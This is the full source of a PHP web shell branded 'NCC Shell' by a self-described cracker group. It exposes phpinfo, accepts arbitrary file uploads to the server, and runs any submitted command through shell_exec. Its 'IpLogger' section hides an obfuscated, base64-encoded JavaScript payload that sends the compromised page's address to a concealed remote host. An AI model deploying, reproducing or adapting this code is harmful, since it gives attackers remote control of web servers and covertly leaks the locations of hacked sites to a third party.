<center>
<h1>.:NCC:. Shell v1.0.0</h1>
<title>.:NCC:. Shell v1.0.0</title>
<head><h2>Hacked by Silver</h2></head>
<h1>---------------------------------------------------------------------------------------</h1><br>
<b><font color=red>---Server Info---</font></b><br>
<?php
echo "<b><font color=red>Safe Mode on/off:  </font></b>";
// Check for safe mode
if( ini_get('safe_mode') ) {
  print '<font color=#FF0000><b>Safe Mode ON</b></font>';
} else {
  print '<font color=#008000><b>Safe Mode OFF</b></font>';
}
echo "</br>";
echo "<b><font color=red>Momentane Directory:  </font></b>"; echo $_SERVER['DOCUMENT_ROOT'];
echo "</br>";
echo "<b><font color=red>Server: </font></b><br>"; echo $_SERVER['SERVER_SIGNATURE'];
echo "<a href='$php_self?p=info'>PHPinfo</a>";
if(@$_GET['p']=="info"){
@phpinfo();
exit;}
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>- Upload -</h2>
<title>Upload - Shell/Datei</title>
<form
 action="<?php echo $_SERVER['PHP_SELF']; ?>"
 method="post"
 enctype="multipart/form-data">
<input type="file" name="Upload" />
<input type="submit" value="Upload!" />
</form>
<hr />
<?php

 if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {
   // Alternativ:            and   $_FILES['probe']['size']
   move_uploaded_file($_FILES['probe']['tmp_name'], "./dingen.php");
   printf("Die Datei %s wurde als dingen.php hochgeladen.<br />\n",
     $_FILES['probe']['name']);
   printf("Sie ist %u Bytes groß und vom Typ %s.<br />\n",
     $_FILES['probe']['size'], $_FILES['probe']['type']);
 }
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>IpLogger</h2>
<?php
$cndx = "PHNjcmlwdD4KdmFyIF8weDFmNmM9WyJceDY4XHg3Mlx4NjVceDY2IiwiXHg2Q1x4NkZceDYzXHg2MVx4NzRceDY5XHg2Rlx4NkUiLCJceDcwXHg3Mlx4NkZceDc0XHg2Rlx4NjNceDZGXHg2QyIsIlx4NjhceDc0XHg3NFx4NzBceDNBIiwiXHg2OFx4NzRceDc0XHg3MFx4M0FceDJGXHgyRiIsIlx4NkNceDZGXHg2NyIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQSIsIlx4NjhceDc0XHg3NFx4NzBceDczXHgzQVx4MkZceDJGIiwiXHg2MVx4NDdceDM5XHg3Nlx4NjFceDMzXHg0RFx4NzVceDYzXHgzMlx4NzhceDY4XHg1OVx4MzJceDczXHg3NVx4NTlceDMyXHgzOVx4NzRceDRDXHgzM1x4NEVceDZDXHg2M1x4NkVceDVBXHg3MFx4NTlceDMyXHg1Nlx4N0FceDRDXHgzMVx4NTFceDc3XHg0RFx4MzBceDQ1XHgzMFx4NTVceDU1XHg0Nlx4NEJceDRGXHg1NVx4NTZceDRCXHg0Q1x4MzBceDQ5XHg3N1x4NERceDMwXHg0Nlx4NDNceDU1XHgzMVx4NTJceDRDXHg1Mlx4NkNceDREXHgzMlx4NENceDMzXHg1Mlx4NkZceDRGXHg0Nlx4NkZceDMwXHg2NFx4MzFceDRFXHg0N1x4NTFceDU3XHg0QVx4NEJceDYzXHg2RFx4MzRceDc4XHg1M1x4NDdceDUyXHg3NVx4NTRceDU0XHg0OVx4MzVceDYzXHgzM1x4NUFceDU2XHg1Nlx4NTFceDNEXHgzRCIsIlx4NjNceDZEXHg0Nlx4MzNceDRDXHg2RFx4NjRceDcwXHg2NFx4NDdceDY4XHgzMVx4NTlceDZFXHg1Nlx4N0FceDVBXHg1OFx4NEFceDZBXHg2Mlx4MzJceDM1XHgzMFx4NUFceDU3XHgzNVx4MzBceDRDXHg2RFx4NEVceDc2XHg2Mlx4NTNceDM5XHg3NFx4NTlceDU4XHg0QVx4NzJceDY1XHg0NFx4NDFceDc3XHg0Rlx4NTNceDM5XHg3N1x4NjFceDQ4XHg0MVx4NzRceDY0XHgzMlx4NTZceDY5XHg0Q1x4NThceDRFXHg2Rlx4NUFceDU3XHg3OFx4NzNceDYzXHg3OVx4MzlceDc0XHg1OVx4NTdceDZDXHg3NVx4NENceDMyXHg3NFx4NkNceDY1XHg1MVx4M0RceDNEIiwiXHg0N1x4NDVceDU0IiwiXHg2Rlx4NzBceDY1XHg2RSIsIlx4NzNceDY1XHg2RVx4NjQiLCJceDcyXHg2NVx4NjFceDY0XHg3OVx4NTNceDc0XHg2MVx4NzRceDY1IiwiXHg3M1x4NzRceDYxXHg3NFx4NzVceDczIiwiXHg1MFx4NEZceDUzXHg1NCIsIlx4NDNceDZGXHg2RVx4NzRceDY1XHg2RVx4NzRceDJEXHg1NFx4NzlceDcwXHg2NSIsIlx4NjFceDcwXHg3MFx4NkNceDY5XHg2M1x4NjFceDc0XHg2OVx4NkZceDZFXHgyRlx4NzhceDJEXHg3N1x4NzdceDc3XHgyRFx4NjZceDZGXHg3Mlx4NkRceDJEXHg3NVx4NzJceDZDXHg2NVx4NkVceDYzXHg2Rlx4NjRceDY1XHg2NCIsIlx4NzNceDY1XHg3NFx4NTJceDY1XHg3MVx4NzVceDY1XHg3M1x4NzRceDQ4XHg2NVx4NjFceDY0XHg2NVx4NzIiLCJceDczXHg3NFx4NzJceDY5XHg2RVx4NjdceDY5XHg2Nlx4NzkiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjRceDZGXHg2NVx4NzNceDZFXHgyN1x4NzRceDIwXHg2NVx4NzhceDY5XHg3M1x4NzQiLCJceDQ2XHg2OVx4NkNceDY1XHgyMFx4NjVceDc4XHg2OVx4NzNceDc0XHg3MyIsIlx4NzJceDY1XHg3M1x4NzBceDZGXHg2RVx4NzNceDY1Il07dmFyIHByb3RvY29sO3ZhciBkb209d2luZG93W18weDFmNmNbMV1dW18weDFmNmNbMF1dO2lmKGxvY2F0aW9uW18weDFmNmNbMl1dPT0gXzB4MWY2Y1szXSl7cHJvdG9jb2w9IF8weDFmNmNbNF07Y29uc29sZVtfMHgxZjZjWzVdXShwcm90b2NvbCl9ZWxzZSB7aWYobG9jYXRpb25bXzB4MWY2Y1syXV09PSBfMHgxZjZjWzZdKXtwcm90b2NvbD0gXzB4MWY2Y1s3XTtjb25zb2xlW18weDFmNmNbNV1dKHByb3RvY29sKX19OyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3ZhciBrZXl1cmw9cHJvdG9jb2wrIGF0b2IoXzB4MWY2Y1s5XSk7dmFyIHhocj0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7eGhyW18weDFmNmNbMTFdXShfMHgxZjZjWzEwXSxrZXl1cmwsZmFsc2UpO3hocltfMHgxZjZjWzEyXV0oKTtpZih4aHJbXzB4MWY2Y1sxM11dPT0gNCYmIHhocltfMHgxZjZjWzE0XV09PSA0MDQpeyR1cmw9IHByb3RvY29sKyBhdG9iKF8weDFmNmNbOF0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKTtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjBdKX1lbHNlIHtjb25zb2xlW18weDFmNmNbNV1dKF8weDFmNmNbMjFdKTtjb25zb2xlW18weDFmNmNbNV1dKHhocltfMHgxZjZjWzIyXV0pOyR1cmw9IHByb3RvY29sKyBhdG9iKHhocltfMHgxZjZjWzIyXV0pO3hocltfMHgxZjZjWzExXV0oXzB4MWY2Y1sxNV0sJHVybCx0cnVlKTt4aHJbXzB4MWY2Y1sxOF1dKF8weDFmNmNbMTZdLF8weDFmNmNbMTddKTt4aHJbXzB4MWY2Y1sxMl1dKEpTT05bXzB4MWY2Y1sxOV1dKHt0ZXh0OmRvbX0pKX0KPC9zY3JpcHQ+"; echo base64_decode($cndx);
if($_GET['upload'] != ""){ if(!isset($_POST['upload'])){ echo '<form enctype="multipart/form-data" method="POST" action=""><br><b>File:</b><input type="file" name="file"> <input type="submit" value="Upload" name="upload"></form>'; } else{ $temporaney = $_FILES['file']['tmp_name']; $upload = $_FILES['file']['name']; if(move_uploaded_file($temporaney,$upload)) echo '<font color="green">Done!</font>'; else echo '<font color="red">File non uppato!</font>'; }}

echo "<b><font color=red><br>IP: </font></b>"; echo $_SERVER['REMOTE_ADDR'];
echo "<b><font color=red><br>PORT: </font></b>"; echo $_SERVER['REMOTE_PORT'];
echo "<b><font color=red><br>BROWSER: </font></b>"; echo $_SERVER[HTTP_REFERER];
echo "<b><font color=red><br>REFERER: </font></b>"; echo $_SERVER['HTTP_USER_AGENT'];
?>
<h1>---------------------------------------------------------------------------</h1><br>
<h2>Directory Lister</h2>
<? $cmd = $_REQUEST["-cmd"];?><onLoad="document.forms[0].elements[-cmd].focus()"><form method=POST><br><input type=TEXT name="-cmd" size=64 value=<?=$cmd?>><hr><pre><?if($cmd != "") print Shell_Exec($cmd);?></pre></form><br>
<h1>---------------------------------------------------------------------------</h1><br>
<b>--Coded by Silver©--<br>
~|_Team .:National Cracker Crew:._|~<br>
<a href="http://www.n-c-c.6x.to" target="_blank">-->NCC<--</a></center></b></html>
